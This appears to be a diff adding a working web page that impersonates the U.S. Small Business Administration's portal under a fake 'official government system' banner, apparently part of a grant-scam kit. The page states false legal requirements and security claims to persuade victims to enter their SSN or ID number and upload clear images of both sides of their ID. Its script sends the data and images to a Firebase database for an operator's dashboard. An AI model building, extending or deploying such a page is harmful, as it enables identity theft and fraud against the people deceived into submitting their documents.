@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | 2026 Identity Authentication</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .upload-area { 
+            border: 2px dashed #1e3a8a; 
+            border-radius: 14px; 
+            padding: 30px; 
+            text-align: center; 
+            margin-bottom: 18px; 
+            background: #ffffff; 
+            cursor: pointer; 
+            transition: all 0.2s ease-in-out;
+        }
+        .upload-area:hover { background: #f8fafc; border-style: solid; box-shadow: 0 4px 12px rgba(30,58,138,0.1); }
+        .preview-text { font-size: 11px; color: #10b981; margin-top: 10px; font-weight: 800; text-transform: uppercase; }
+        .instruction-box { 
+            background: #fffbeb; 
+            border: 1px solid #fef3c7; 
+            padding: 18px; 
+            border-radius: 10px; 
+            margin-bottom: 25px; 
+            font-size: 11px; 
+            color: #92400e; 
+            line-height: 1.6; 
+        }
+        select, input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #cbd5e1; box-sizing: border-box; font-family: inherit; font-size: 14px; }
+        label { display: block; font-size: 12px; font-weight: 800; color: #1e3a8a; margin-bottom: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 0.5px; }
+    </style>
+</head>
+<body style="background: #f1f5f9;">
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+    </div>
+
+    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 14px 16px; background: #00274c;">
+        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
+            BACK
+        </button>
+    </div>
+
+    <div class="container">
+        <div class="card" style="margin-top: 20px; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); border-top: 6px solid #ba0c2f;">
+            <h2 style="color: #00274c; font-size: 22px; margin-bottom: 5px; letter-spacing: -0.5px;">Identity Authentication</h2>
+            
+            <div class="instruction-box">
+                <b style="display: block; margin-bottom: 5px;">FEDERAL COMPLIANCE NOTICE:</b> 
+                Pursuant to the <b>Patriot Act</b> and 31 CFR § 1010.230, you must provide a valid government ID. Images must be clear, uncropped, and show all four corners of the document.
+            </div>
+            
+            <label>Authentication Document Type</label>
+            <select id="idType">
+                <option value="Driver's License">U.S. Driver's License</option>
+                <option value="Social Security Card">Social Security Card (SSN)</option>
+                <option value="US Passport">U.S. Passport Book/Card</option>
+                <option value="State ID">State-Issued Identification</option>
+            </select>
+
+            <label id="numLabel">Identification Number</label>
+            <input type="text" id="idNumber" placeholder="Enter ID number accurately">
+
+            <label>Front of Document (High Resolution)</label>
+            <div class="upload-area" onclick="document.getElementById('fileFront').click()">
+                <span style="font-size: 32px;">🪪</span>
+                <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Click to Upload Front</b>
+                <input type="file" id="fileFront" hidden accept="image/*">
+                <div class="preview-text" id="frontName"></div>
+            </div>
+
+            <label>Back of Document (High Resolution)</label>
+            <div class="upload-area" onclick="document.getElementById('fileBack').click()">
+                <span style="font-size: 32px;">🪪</span>
+                <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Click to Upload Back</b>
+                <input type="file" id="fileBack" hidden accept="image/*">
+                <div class="preview-text" id="backName"></div>
+            </div>
+
+            <button id="uploadBtn" style="background: #00274c; color: white; padding: 18px; border-radius: 12px; width: 100%; font-weight: 800; border: none; margin-top: 20px; cursor: pointer; text-transform: uppercase; letter-spacing: 1.5px; box-shadow: 0 4px 15px rgba(0,39,76,0.2);">
+                Submit for 2026 Verification
+            </button>
+        </div>
+
+        <p style="text-align:center; font-size:10px; color:#94a3b8; margin-top: 25px; padding: 0 20px; line-height: 1.6;">
+            🛡️ <b>ENCRYPTION ACTIVE:</b> All data is processed via Department of Treasury security standards. Misrepresentation of identity to obtain federal funds is a felony.
+        </p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged, reload } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getFirestore, collection, addDoc, getDoc, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
+            authDomain: "sba-grant-2026.firebaseapp.com",
+            projectId: "sba-grant-2026",
+            storageBucket: "sba-grant-2026.firebasestorage.app",
+            messagingSenderId: "838430821326",
+            appId: "1:838430821326:web:6438deacb334076a64f99f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        // Security: Ensure user is logged in
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) {
+                window.location.href = 'index.html';
+            } else {
+                await reload(user);
+                if (!user.emailVerified) window.location.href = 'verify.html';
+            }
+        });
+
+        // Dynamic Label Logic
+        document.getElementById('idType').addEventListener('change', (e) => {
+            const label = document.getElementById('numLabel');
+            const type = e.target.value;
+            if(type === "Social Security Card") label.innerText = "Social Security Number (SSN)";
+            else if(type === "US Passport") label.innerText = "Passport Number";
+            else label.innerText = type + " Number";
+        });
+
+        // File Selection Feedback
+        document.getElementById('fileFront').onchange = (e) => { 
+            if(e.target.files[0]) document.getElementById('frontName').innerText = "✅ FRONT_DOC_LOADED"; 
+        };
+        document.getElementById('fileBack').onchange = (e) => { 
+            if(e.target.files[0]) document.getElementById('backName').innerText = "✅ BACK_DOC_LOADED"; 
+        };
+
+        // --- SMART RESIZER FUNCTION ---
+        // Resizes images to fit within Firestore's 1MB limit while keeping them readable
+        const resizeAndBase64 = (file) => new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            reader.onload = (event) => {
+                const img = new Image();
+                img.src = event.target.result;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    let width = img.width;
+                    let height = img.height;
+
+                    // Maximum dimension of 1000 pixels
+                    const max_size = 1000;
+                    if (width > height) {
+                        if (width > max_size) { height *= max_size / width; width = max_size; }
+                    } else {
+                        if (height > max_size) { width *= max_size / height; height = max_size; }
+                    }
+                    canvas.width = width;
+                    canvas.height = height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, width, height);
+                    
+                    // Convert to JPEG with 60% quality to save space
+                    resolve(canvas.toDataURL('image/jpeg', 0.6));
+                };
+            };
+            reader.onerror = error => reject(error);
+        });
+
+        const uploadBtn = document.getElementById('uploadBtn');
+
+        uploadBtn.addEventListener('click', async () => {
+            const user = auth.currentUser;
+            const frontFile = document.getElementById('fileFront').files[0];
+            const backFile = document.getElementById('fileBack').files[0];
+            const idNum = document.getElementById('idNumber').value.trim();
+            const type = document.getElementById('idType').value;
+
+            if(!frontFile || !backFile || !idNum) return alert("REQUIRED: ID Number and both document sides must be uploaded.");
+
+            uploadBtn.innerText = "SECURELY TRANSMITTING...";
+            uploadBtn.disabled = true;
+
+            try {
+                // Resize and convert images
+                const frontData = await resizeAndBase64(frontFile);
+                const backData = await resizeAndBase64(backFile);
+
+                const userSnap = await getDoc(doc(db, "users", user.uid));
+                const userData = userSnap.data();
+
+                // 1. Submit Request to the Admin Dashboard
+                await addDoc(collection(db, "requests"), {
+                    userId: user.uid,
+                    userName: userData.fullName || "Valued User",
+                    userEmail: user.email,
+                    type: "KYC_SUBMISSION",
+                    idType: type,
+                    idNumber: idNum,
+                    frontImg: frontData,
+                    backImg: backData,
+                    status: "PENDING",
+                    timestamp: serverTimestamp()
+                });
+
+                // 2. Update status to trigger Dashboard review mode
+                await updateDoc(doc(db, "users", user.uid), {
+                    status: "DOCUMENTS UNDER REVIEW",
+                    kycStatus: "SUBMITTED"
+                });
+
+                alert("TRANSMISSION SUCCESS: Your identity packet has been received for federal audit.");
+                window.location.href = 'dashboard.html';
+
+            } catch(e) { 
+                console.error(e);
+                alert("HANDSHAKE ERROR: Data packet too large or network error. Please try again with a clearer photo.");
+                uploadBtn.innerText = "Submit for 2026 Verification";
+                uploadBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
